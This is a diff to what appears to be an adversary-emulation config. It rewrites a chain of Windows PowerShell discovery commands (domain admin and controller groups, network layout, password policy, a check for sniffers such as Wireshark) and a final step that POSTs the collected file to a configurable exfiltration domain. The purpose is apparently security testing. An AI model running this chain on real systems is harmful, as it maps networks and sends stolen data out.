@@ -101,13 +101,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{tasklist /svc > ",
-                            "self.target_1_temp_file",
-                            "; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{tasklist /svc > ${self.target_1_temp_file}; echo \" \"}"
                 }
             }
         },
@@ -120,13 +114,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{reg query hklm\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation /v SystemManufacturer >> ",
-                            "self.target_1_temp_file",
-                            "; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{reg query hklm\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation /v SystemManufacturer >> ${self.target_1_temp_file}; echo \" \"}"
                 }
             }
         },
@@ -139,13 +127,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{reg query hklm\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation /v SystemProductName >> ",
-                            "self.target_1_temp_file",
-                            "; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{reg query hklm\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation /v SystemProductName >> ${self.target_1_temp_file}; echo \" \"}"
                 }
             }
         },
@@ -158,13 +140,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{reg query hklm\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0 /v ProcessorNameString >> ",
-                            "self.target_1_temp_file",
-                            "; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{reg query hklm\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0 /v ProcessorNameString >> ${self.target_1_temp_file}; echo \" \"}"
                 }
             }
         },
@@ -177,13 +153,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{arp -a >> ",
-                            "self.target_1_temp_file",
-                            "; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{arp -a >> ${self.target_1_temp_file}; echo \" \"}"
                 }
             }
         },
@@ -196,13 +166,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{nbtstat -n >> ",
-                            "self.target_1_temp_file",
-                            "; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{nbtstat -n >> ${self.target_1_temp_file}; echo \" \"}"
                 }
             }
         },
@@ -215,13 +179,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{net config workstation >> ",
-                            "self.target_1_temp_file",
-                            "; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{net config workstation >> ${self.target_1_temp_file}; echo \" \"}"
                 }
             }
         },
@@ -234,13 +192,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{ipconfig /all >> ",
-                            "self.target_1_temp_file",
-                            "; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{ipconfig /all >> ${self.target_1_temp_file}; echo \" \"}"
                 }
             }
         },
@@ -253,13 +205,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{route print >> ",
-                            "self.target_1_temp_file",
-                            "; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{route print >> ${self.target_1_temp_file}; echo \" \"}"
                 }
             }
         },
@@ -272,13 +218,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{tracert -h 10 yahoo.com >> ",
-                            "self.target_1_temp_file",
-                            "; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{tracert -h 10 yahoo.com >> ${self.target_1_temp_file}; echo \" \"}"
                 }
             }
         },
@@ -291,13 +231,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{net view >> ",
-                            "self.target_1_temp_file",
-                            "; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{net view >> ${self.target_1_temp_file}; echo \" \"}"
                 }
             }
         },
@@ -310,13 +244,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{net view /domain >> ",
-                            "self.target_1_temp_file",
-                            "; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{net view /domain >> ${self.target_1_temp_file}; echo \" \"}"
                 }
             }
         },
@@ -329,13 +257,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{net group \"Domain Computers\" /domain >> ",
-                            "self.target_1_temp_file",
-                            "; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{net group \"Domain Computers\" /domain >> ${self.target_1_temp_file}; echo \" \"}"
                 }
             }
         },
@@ -348,13 +270,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{net group \"Domain Controllers\" /domain >> ",
-                            "self.target_1_temp_file",
-                            "; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{net group \"Domain Controllers\" /domain >> ${self.target_1_temp_file}; echo \" \"}"
                 }
             }
         },
@@ -367,13 +283,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{net group \"Exchange Servers\" /domain >> ",
-                            "self.target_1_temp_file",
-                            "; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{net group \"Exchange Servers\" /domain >> ${self.target_1_temp_file}; echo \" \"}"
                 }
             }
         },
@@ -386,13 +296,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{netstat -an >> ",
-                            "self.target_1_temp_file",
-                            "; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{netstat -an >> ${self.target_1_temp_file}; echo \" \"}"
                 }
             }
         },
@@ -405,13 +309,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{tasklist /v >> ",
-                            "self.target_1_temp_file",
-                            "; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{tasklist /v >> ${self.target_1_temp_file}; echo \" \"}"
                 }
             }
         },
@@ -424,13 +322,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{net localgroup >> ",
-                            "self.target_1_temp_file",
-                            "; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{net localgroup >> ${self.target_1_temp_file}; echo \" \"}"
                 }
             }
         },
@@ -443,13 +335,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{net localgroup Administrators >> ",
-                            "self.target_1_temp_file",
-                            "; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{net localgroup Administrators >> ${self.target_1_temp_file}; echo \" \"}"
                 }
             }
         },
@@ -462,13 +348,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{net group \"Domain Admins\" /domain >> ",
-                            "self.target_1_temp_file",
-                            "; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{net group \"Domain Admins\" /domain >> ${self.target_1_temp_file}; echo \" \"}"
                 }
             }
         },
@@ -481,13 +361,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{gpresult /z >> ",
-                            "self.target_1_temp_file",
-                            "; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{gpresult /z >> ${self.target_1_temp_file}; echo \" \"}"
                 }
             }
         },
@@ -500,13 +374,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{systeminfo >> ",
-                            "self.target_1_temp_file",
-                            "; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{systeminfo >> ${self.target_1_temp_file}; echo \" \"}"
                 }
             }
         },
@@ -519,13 +387,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{set >> ",
-                            "self.target_1_temp_file",
-                            "; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{set >> ${self.target_1_temp_file}; echo \" \"}"
                 }
             }
         },
@@ -538,13 +400,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{fsutil fsinfo drives >> ",
-                            "self.target_1_temp_file",
-                            "; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{fsutil fsinfo drives >> ${self.target_1_temp_file}; echo \" \"}"
                 }
             }
         },
@@ -557,13 +413,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{net time >> ",
-                            "self.target_1_temp_file",
-                            "; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{net time >> ${self.target_1_temp_file}; echo \" \"}"
                 }
             }
         },
@@ -576,13 +426,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{net accounts >> ",
-                            "self.target_1_temp_file",
-                            "; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{net accounts >> ${self.target_1_temp_file}; echo \" \"}"
                 }
             }
         },
@@ -595,13 +439,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{net accounts /domain >> ",
-                            "self.target_1_temp_file",
-                            "; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{net accounts /domain >> ${self.target_1_temp_file}; echo \" \"}"
                 }
             }
         },
@@ -614,13 +452,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{Get-Process | Select-String 'msmp|tcpdump|windump|ethereal|wireshark|ettercap|snoop|dsniff' >> ",
-                            "self.target_1_temp_file",
-                            "; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{Get-Process | Select-String 'msmp|tcpdump|windump|ethereal|wireshark|ettercap|snoop|dsniff' >> ${self.target_1_temp_file}; echo \" \"}"
                 }
             }
         },
@@ -645,15 +477,7 @@
                 "target": "self.target_1",
                 "exfil": "self.exfil",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{Invoke-RestMethod -Uri ",
-                            "self.exfil_domain",
-                            "/ -Method Post -InFile ",
-                            "self.target_1_temp_file",
-                            ";echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{Invoke-RestMethod -Uri ${self.exfil_domain}/ -Method Post -InFile ${self.target_1_temp_file};echo \" \"}"
                 }
             }
         },
